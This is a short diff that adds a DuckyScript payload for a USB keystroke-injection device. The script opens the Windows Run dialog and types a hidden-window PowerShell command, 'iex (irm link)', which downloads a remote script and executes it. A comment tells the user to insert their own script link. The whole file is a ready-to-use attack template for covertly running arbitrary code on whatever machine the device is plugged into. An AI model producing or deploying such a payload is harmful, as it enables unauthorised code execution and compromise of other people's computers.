@@ -1,0 +1,7 @@
+DELAY 1000
+GUI r
+DELAY 300
+REM Put Your PowerShell Scripts Link Here
+STRING powershell -w h iex (irm link)
+DELAY 200
+ENTER
